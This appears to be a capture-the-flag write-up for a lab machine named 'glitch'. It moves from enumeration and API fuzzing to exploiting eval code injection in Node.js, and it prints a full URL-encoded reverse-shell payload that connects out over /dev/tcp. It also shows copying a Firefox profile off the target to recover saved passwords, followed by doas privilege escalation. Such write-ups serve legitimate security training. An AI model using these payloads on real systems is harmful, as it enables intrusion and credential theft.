
## Enumeration

1. Starting off with our go to initial nmap scan of `nmap -sV -sC -o nmap.txt 10.114.189.117` and get just one port result as open which could mean we maybe need to run nmap on all ports but first lets explore the open http port
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 09:50 SAST
Nmap scan report for 10.114.189.117
Host is up (0.23s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

2. On the page we just get a not allowed message, but inspecting the source code we see references to the img directory and an API directory declaration for access. The first task mentions something about an "access token" so I navigated to `/api/access` directory to see if it was here and it was!


## Task 1

1. We received the token which seems to be base64 encoded so I just copied to a file in my local machine and ran `base64 -d token > decoded.txt` and got the plain text version of the token and this is our flag

## Task 2

1. know we need to find a user.txt file which I assume we need to access somehow using our given token somewhere. I started off with a directory scan to see if there were any hidden directories we need to use to get shell. 
2. I first started off by open the developer tools on the / directory, and adding the token we found to the token parameter in storage > cookies and refreshed the page and got some new content to view.
3. Looking around in our developer tools -> network tab we see file called script.js being loaded on the page and here we find another api called `api/items` where by navigating to this API directory we get the output below
```
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

4. If we try curl a POST request to this API we receive the message below which doesn't give us a lot of information but at least we know we can send POST requests to the directory and can try fuzzing for possible other calls we can make to this API.
```
┌──(kali㉿kali)-[~/Documents/labs/glitch]
└─$ curl -X POST http://10.114.189.117/api/items
{"message":"there_is_a_glitch_in_the_matrix"} 
```


5. To fuzz we ran this command which I did use the help of a friendly AI assistant to construct, and we get the result showing us "cmd" is a successfully parameter for this API meaning we can possibly run commands on the server with this
```
┌──(kali㉿kali)-[~/Documents/labs/glitch]
└─$ wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 http://10.114.189.117/api/items\?FUZZ\=test
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.114.189.117/api/items?FUZZ=test
Total requests: 3132

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                         
=====================================================================

000000358:   500        10 L     64 W       1081 Ch     "cmd"                                                                                                                                                  
```

6. So I opened up burp and sent the request to repeater, changed it from GET to POST to view its output. The response showed that the application was running node js framework to host it based on its output and I assumed we need to use this information to access and get a reverse to the server 
```
ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br>
```

7. I did some research on getting reverse shells with node js and found a useful article [here](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44) which gave me the exact command to add to the end of our request for a reverse shell and with URL encoding this string looked something like this:

```
POST /api/items/?cmd=require("child_process").exec("%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.144.74%2F4444%200%3E%261%27") HTTP/1.1
```

8. Starting up our netcat listen with `nc -nvlp 4444` and sending the request we managed to get shell! We simply navigate to the home/user directory and cat out the user.txt to get our flag!


## Task 3


1. now time for some privilege escalation. In the same home/user directory we find a directory called ".firefox", which could store sensitive system user passwords and usernames.
2. We first compress it with `tar -cvf firefox.tar .firefox` and to transfer this over we run the following commands on our target machine 
```
scp firefox.tar kali@LOCAL_IP
```

then on our local machine 

```
tar xvf ~/firefox.tar

firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
```

3. Opening the website and looking at the stored credentials on firefox we find v0id's password and use it to change our reverse shell user with `sudo v0id`
4. Now after running  privilege escalation checks again and we find a tool called "doas" when running SUID permissions check with this command `find / -perm -4000 2>/dev/null`
5. After some googling I found it you can elevate privileges with misconfigured SUID on doas with the command of `doas -u root /bin/bash` 
6. Once you get root you simply go to the root directory and cat out the text to get the flag!
